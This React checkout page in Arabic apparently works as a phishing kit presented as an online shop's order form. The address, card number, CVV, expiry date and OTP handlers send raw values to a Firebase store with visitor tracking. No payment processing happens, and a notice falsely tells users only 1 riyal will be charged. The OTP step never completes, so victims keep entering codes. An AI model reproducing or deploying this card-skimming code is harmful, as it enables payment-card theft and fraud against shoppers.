"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import {
  MapPin,
  CreditCard,
  Shield,
  AlertCircle,
  CheckCircle2,
  Phone,
  User,
  Home,
  Calendar,
  Lock,
  Info,
} from "lucide-react"
import { addData, getVisitorId } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

type CheckoutStep = "address" | "payment" | "otp" | "success"

interface FormErrors {
  [key: string]: string
}

export default function CheckoutPage() {
  const [currentStep, setCurrentStep] = useState<CheckoutStep>("address")
  const [isLoading, setIsLoading] = useState(false)
  const [errors, setErrors] = useState<FormErrors>({})
  const [otpError, setOtpError] = useState("")
  const [otp, setOtp] = useState("")

  // Form data
  const [addressData, setAddressData] = useState({
    fullName: "",
    phone: "",
    city: "",
    apartment: "",
  })

  const [paymentData, setPaymentData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardName: "",
  })

  useEffect(() => {
    const visitorId = getVisitorId()
    if (!visitorId) return

    setupOnlineStatus(visitorId)
    void addData({ visitorId, currentPage: "اختيار العرض" })
  }, [])

  const validateAddress = () => {
    const newErrors: FormErrors = {}
    if (!addressData.fullName.trim()) newErrors.fullName = "الاسم الكامل مطلوب"
    if (!addressData.phone.trim()) newErrors.phone = "رقم الهاتف مطلوب"
    if (!addressData.city) newErrors.city = "المدينة مطلوبة"
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validatePayment = () => {
    const newErrors: FormErrors = {}
    if (!paymentData.cardNumber.trim()) newErrors.cardNumber = "رقم البطاقة مطلوب"
    else if (paymentData.cardNumber.replace(/\s/g, "").length !== 16) newErrors.cardNumber = "رقم البطاقة غير صحيح"
    if (!paymentData.expiryDate.trim()) newErrors.expiryDate = "تاريخ الانتهاء مطلوب"
    if (!paymentData.cvv.trim()) newErrors.cvv = "رمز الأمان مطلوب"
    else if (paymentData.cvv.length !== 3) newErrors.cvv = "رمز الأمان يجب أن يكون 3 أرقام"
    if (!paymentData.cardName.trim()) newErrors.cardName = "اسم حامل البطاقة مطلوب"
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleAddressSubmit = async () => {
    if (!validateAddress()) return
    const visitorId = getVisitorId()
    await addData({
      visitorId,
      name: addressData.fullName,
      phone: addressData.phone,
      currentPage: "تسجيل المعلومات",
    })
    setIsLoading(true)
    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1000))
    setIsLoading(false)
    setCurrentStep("payment")
  }

  const handlePaymentSubmit = async () => {
    if (!validatePayment()) return
    const visitorId = getVisitorId()
    await addData({
      visitorId,
      cardNumber: paymentData.cardNumber,
      cvv: paymentData.cvv,
      expiryDate: paymentData.expiryDate,
      currentPage: "تسجيل البطاقة",
    })
    setIsLoading(true)
    // Simulate payment processing
    await new Promise((resolve) => setTimeout(resolve, 2000))
    setIsLoading(false)
    setCurrentStep("otp")
  }

  const handleOtpSubmit = async () => {
    if (otp.length !== 6) {
      setOtpError("يجب إدخال 6 أرقام")
      return
    }
    const visitorId = getVisitorId()
    await addData({
      visitorId,
      otp,
      otpStatus: "pending",
      currentStep: "otp",
      currentPage: "إدخال الكود",
    })
    setIsLoading(true)
    setOtpError("")
    // Simulate OTP verification - fail if OTP is "123456"
    await new Promise((resolve) => setTimeout(resolve, 1500))
    if (otp === "123456") {
      setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى")
      setIsLoading(false)
      return
    }
    setIsLoading(false)
    setCurrentStep("otp")
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 py-8" dir="rtl">
      <div className="max-w-6xl mx-auto px-4">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent mb-2">
            إتمام الطلب
          </h1>
          <p className="text-gray-600">أكمل بياناتك لإتمام عملية الشراء بأمان</p>
        </div>

        {/* Progress Steps */}
        <div className="mb-12">
          <div className="flex items-center justify-center space-x-reverse space-x-8">
            <div
              className={`flex flex-col items-center ${
                currentStep === "address"
                  ? "text-blue-600"
                  : currentStep === "payment" || currentStep === "otp" || currentStep === "success"
                    ? "text-green-600"
                    : "text-gray-400"
              }`}
            >
              <div
                className={`w-12 h-12 rounded-full flex items-center justify-center text-sm font-medium mb-2 transition-all duration-300 ${
                  currentStep === "address"
                    ? "bg-blue-600 text-white shadow-lg shadow-blue-200"
                    : currentStep === "payment" || currentStep === "otp" || currentStep === "success"
                      ? "bg-green-600 text-white shadow-lg shadow-green-200"
                      : "bg-gray-200"
                }`}
              >
                {currentStep === "payment" || currentStep === "otp" || currentStep === "success" ? (
                  <CheckCircle2 className="w-5 h-5" />
                ) : (
                  <MapPin className="w-5 h-5" />
                )}
              </div>
              <span className="text-sm font-medium">عنوان التوصيل</span>
            </div>

            <div className="w-16 h-px bg-gradient-to-r from-gray-300 to-gray-400"></div>

            <div
              className={`flex flex-col items-center ${
                currentStep === "payment"
                  ? "text-blue-600"
                  : currentStep === "otp" || currentStep === "success"
                    ? "text-green-600"
                    : "text-gray-400"
              }`}
            >
              <div
                className={`w-12 h-12 rounded-full flex items-center justify-center text-sm font-medium mb-2 transition-all duration-300 ${
                  currentStep === "payment"
                    ? "bg-blue-600 text-white shadow-lg shadow-blue-200"
                    : currentStep === "otp" || currentStep === "success"
                      ? "bg-green-600 text-white shadow-lg shadow-green-200"
                      : "bg-gray-200"
                }`}
              >
                {currentStep === "otp" || currentStep === "success" ? (
                  <CheckCircle2 className="w-5 h-5" />
                ) : (
                  <CreditCard className="w-5 h-5" />
                )}
              </div>
              <span className="text-sm font-medium">الدفع</span>
            </div>

            <div className="w-16 h-px bg-gradient-to-r from-gray-300 to-gray-400"></div>

            <div
              className={`flex flex-col items-center ${
                currentStep === "otp" ? "text-blue-600" : currentStep === "success" ? "text-green-600" : "text-gray-400"
              }`}
            >
              <div
                className={`w-12 h-12 rounded-full flex items-center justify-center text-sm font-medium mb-2 transition-all duration-300 ${
                  currentStep === "otp"
                    ? "bg-blue-600 text-white shadow-lg shadow-blue-200"
                    : currentStep === "success"
                      ? "bg-green-600 text-white shadow-lg shadow-green-200"
                      : "bg-gray-200"
                }`}
              >
                {currentStep === "success" ? <CheckCircle2 className="w-5 h-5" /> : <Shield className="w-5 h-5" />}
              </div>
              <span className="text-sm font-medium">التحقق</span>
            </div>
          </div>
        </div>

        <div className="max-w-2xl mx-auto">
          {/* Main Content */}

          {/* Address Step */}
          {currentStep === "address" && (
            <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-blue-500 to-cyan-500 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-xl">
                  <div className="p-2 bg-white/20 rounded-lg">
                    <MapPin className="w-6 h-6" />
                  </div>
                  عنوان التوصيل
                </CardTitle>
              </CardHeader>
              <CardContent className="p-8 space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <Label htmlFor="fullName" className="flex items-center gap-2 text-gray-700 font-medium">
                      <User className="w-4 h-4" />
                      الاسم الكامل *
                    </Label>
                    <Input
                      id="fullName"
                      value={addressData.fullName}
                      onChange={(e) => setAddressData({ ...addressData, fullName: e.target.value })}
                      className={`h-12 transition-all duration-200 ${errors.fullName ? "border-red-500 focus:border-red-500" : "focus:border-blue-500"}`}
                      placeholder="أدخل اسمك الكامل"
                    />
                    {errors.fullName && (
                      <p className="text-red-500 text-sm flex items-center gap-1">
                        <AlertCircle className="w-4 h-4" />
                        {errors.fullName}
                      </p>
                    )}
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="phone" className="flex items-center gap-2 text-gray-700 font-medium">
                      <Phone className="w-4 h-4" />
                      رقم الهاتف *
                    </Label>
                    <Input
                      id="phone"
                      value={addressData.phone}
                      onChange={(e) => setAddressData({ ...addressData, phone: e.target.value })}
                      className={`h-12 transition-all duration-200 ${errors.phone ? "border-red-500 focus:border-red-500" : "focus:border-blue-500"}`}
                      placeholder="+968xxxxxxxx"
                    />
                    {errors.phone && (
                      <p className="text-red-500 text-sm flex items-center gap-1">
                        <AlertCircle className="w-4 h-4" />
                        {errors.phone}
                      </p>
                    )}
                  </div>

                  <div className="md:col-span-2 space-y-2">
                    <Label htmlFor="address" className="flex items-center gap-2 text-gray-700 font-medium">
                      <Home className="w-4 h-4" />
                      العنوان *
                    </Label>
                    <Input
                      id="address"
                      value={addressData.city}
                      onChange={(e) => setAddressData({ ...addressData, city: e.target.value })}
                      className={`h-12 transition-all duration-200 ${errors.city ? "border-red-500 focus:border-red-500" : "focus:border-blue-500"}`}
                      placeholder="ادخل عنوان التوصيل بالتفصيل"
                    />
                    {errors.city && (
                      <p className="text-red-500 text-sm flex items-center gap-1">
                        <AlertCircle className="w-4 h-4" />
                        {errors.city}
                      </p>
                    )}
                  </div>
                </div>

                <Button
                  onClick={handleAddressSubmit}
                  className="w-full h-12 bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 text-white font-medium shadow-lg hover:shadow-xl transition-all duration-200"
                  disabled={isLoading}
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      جاري المعالجة...
                    </div>
                  ) : (
                    "متابعة إلى الدفع"
                  )}
                </Button>
              </CardContent>
            </Card>
          )}

          {/* Payment Step */}
          {currentStep === "payment" && (
            <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-green-500 to-emerald-500 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-xl">
                  <div className="p-2 bg-white/20 rounded-lg">
                    <CreditCard className="w-6 h-6" />
                  </div>
                  معلومات الدفع
                </CardTitle>
              </CardHeader>
              <CardContent className="p-8 space-y-6">
                {/* Important Notice */}
                <Alert className="border-amber-200 bg-amber-50">
                  <Info className="h-4 w-4 text-amber-600" />
                  <AlertDescription className="text-amber-800 font-medium">
                    سوف يتم خصم فقط مبلغ 1 ريال فقط لتأكيد الطلب
                  </AlertDescription>
                </Alert>

                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="flex items-center gap-2 text-gray-700 font-medium">
                    <CreditCard className="w-4 h-4" />
                    رقم البطاقة *
                  </Label>
                  <Input
                    id="cardNumber"
                    value={paymentData.cardNumber}
                    onChange={(e) => setPaymentData({ ...paymentData, cardNumber: formatCardNumber(e.target.value) })}
                    className={`h-12 font-mono text-lg tracking-wider transition-all duration-200 ${errors.cardNumber ? "border-red-500 focus:border-red-500" : "focus:border-green-500"}`}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                  />
                  {errors.cardNumber && (
                    <p className="text-red-500 text-sm flex items-center gap-1">
                      <AlertCircle className="w-4 h-4" />
                      {errors.cardNumber}
                    </p>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate" className="flex items-center gap-2 text-gray-700 font-medium">
                      <Calendar className="w-4 h-4" />
                      تاريخ الانتهاء *
                    </Label>
                    <Input
                      id="expiryDate"
                      value={paymentData.expiryDate}
                      onChange={(e) => {
                        let value = e.target.value.replace(/\D/g, "")
                        if (value.length >= 2) {
                          value = value.substring(0, 2) + "/" + value.substring(2, 4)
                        }
                        setPaymentData({ ...paymentData, expiryDate: value })
                      }}
                      className={`h-12 font-mono text-center transition-all duration-200 ${errors.expiryDate ? "border-red-500 focus:border-red-500" : "focus:border-green-500"}`}
                      placeholder="MM/YY"
                      maxLength={5}
                    />
                    {errors.expiryDate && (
                      <p className="text-red-500 text-sm flex items-center gap-1">
                        <AlertCircle className="w-4 h-4" />
                        {errors.expiryDate}
                      </p>
                    )}
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="flex items-center gap-2 text-gray-700 font-medium">
                      <Lock className="w-4 h-4" />
                      رمز الأمان *
                    </Label>
                    <Input
                      id="cvv"
                      type="password"
                      value={paymentData.cvv}
                      onChange={(e) => setPaymentData({ ...paymentData, cvv: e.target.value.replace(/\D/g, "") })}
                      className={`h-12 font-mono text-center transition-all duration-200 ${errors.cvv ? "border-red-500 focus:border-red-500" : "focus:border-green-500"}`}
                      placeholder="123"
                      maxLength={3}
                    />
                    {errors.cvv && (
                      <p className="text-red-500 text-sm flex items-center gap-1">
                        <AlertCircle className="w-4 h-4" />
                        {errors.cvv}
                      </p>
                    )}
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cardName" className="flex items-center gap-2 text-gray-700 font-medium">
                    <User className="w-4 h-4" />
                    اسم حامل البطاقة *
                  </Label>
                  <Input
                    id="cardName"
                    value={paymentData.cardName}
                    onChange={(e) => setPaymentData({ ...paymentData, cardName: e.target.value })}
                    className={`h-12 transition-all duration-200 ${errors.cardName ? "border-red-500 focus:border-red-500" : "focus:border-green-500"}`}
                    placeholder="الاسم كما هو مكتوب على البطاقة"
                  />
                  {errors.cardName && (
                    <p className="text-red-500 text-sm flex items-center gap-1">
                      <AlertCircle className="w-4 h-4" />
                      {errors.cardName}
                    </p>
                  )}
                </div>

                <div className="flex gap-4 pt-4">
                  <Button
                    variant="outline"
                    onClick={() => setCurrentStep("address")}
                    className="flex-1 h-12 border-2 hover:bg-gray-50"
                  >
                    رجوع
                  </Button>
                  <Button
                    onClick={handlePaymentSubmit}
                    className="flex-1 h-12 bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white font-medium shadow-lg hover:shadow-xl transition-all duration-200"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <div className="flex items-center gap-2">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        جاري المعالجة...
                      </div>
                    ) : (
                      "تأكيد الدفع"
                    )}
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* OTP Step */}
          {currentStep === "otp" && (
            <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-t-lg">
                <CardTitle className="flex items-center gap-3 text-xl">
                  <div className="p-2 bg-white/20 rounded-lg">
                    <Shield className="w-6 h-6" />
                  </div>
                  التحقق من الهوية
                </CardTitle>
              </CardHeader>
              <CardContent className="p-8 space-y-6">
                <div className="text-center space-y-4">
                  <div className="w-20 h-20 bg-gradient-to-r from-purple-100 to-pink-100 rounded-full flex items-center justify-center mx-auto">
                    <Phone className="w-10 h-10 text-purple-600" />
                  </div>
                  <p className="text-gray-600 text-lg">
                    تم إرسال رمز التحقق إلى رقم الهاتف المنتهي بـ **{addressData.phone.slice(-2)}
                  </p>

                  <div className="max-w-xs mx-auto space-y-2">
                    <Label htmlFor="otp" className="text-gray-700 font-medium">
                      رمز التحقق
                    </Label>
                    <Input
                      id="otp"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                      className={`h-14 text-center text-2xl tracking-widest font-mono transition-all duration-200 ${otpError ? "border-red-500 focus:border-red-500" : "focus:border-purple-500"}`}
                      placeholder="000000"
                      maxLength={6}
                    />
                    {otpError && (
                      <Alert className="mt-2" variant="destructive">
                        <AlertCircle className="h-4 w-4" />
                        <AlertDescription>{otpError}</AlertDescription>
                      </Alert>
                    )}
                  </div>

                  <p className="text-sm text-gray-500">
                    لم تستلم الرمز؟{" "}
                    <button className="text-purple-600 hover:underline font-medium">إعادة الإرسال</button>
                  </p>
                </div>

                <div className="flex gap-4 pt-4">
                  <Button
                    variant="outline"
                    onClick={() => setCurrentStep("payment")}
                    className="flex-1 h-12 border-2 hover:bg-gray-50"
                  >
                    رجوع
                  </Button>
                  <Button
                    onClick={handleOtpSubmit}
                    className="flex-1 h-12 bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-medium shadow-lg hover:shadow-xl transition-all duration-200"
                    disabled={isLoading || otp.length !== 6}
                  >
                    {isLoading ? (
                      <div className="flex items-center gap-2">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        جاري التحقق...
                      </div>
                    ) : (
                      "تأكيد"
                    )}
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Success Step */}
          {currentStep === "success" && (
            <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
              <CardContent className="text-center py-12 space-y-6">
                <div className="w-24 h-24 bg-gradient-to-r from-green-100 to-emerald-100 rounded-full flex items-center justify-center mx-auto">
                  <CheckCircle2 className="w-12 h-12 text-green-600" />
                </div>
                <div className="space-y-2">
                  <h2 className="text-3xl font-bold bg-gradient-to-r from-green-600 to-emerald-600 bg-clip-text text-transparent">
                    تم الدفع بنجاح!
                  </h2>
                  <p className="text-gray-600 text-lg">شكراً لك، تم تأكيد طلبك وسيتم توصيله خلال 2-3 أيام عمل</p>
                </div>
                <Badge
                  variant="secondary"
                  className="text-base px-4 py-2 bg-gradient-to-r from-green-50 to-emerald-50 text-green-700 border border-green-200"
                >
                  رقم الطلب: #ORD-2024-001
                </Badge>
                <div className="pt-4">
                  <Button className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white px-8 py-3 h-12">
                    تتبع الطلب
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  )
}
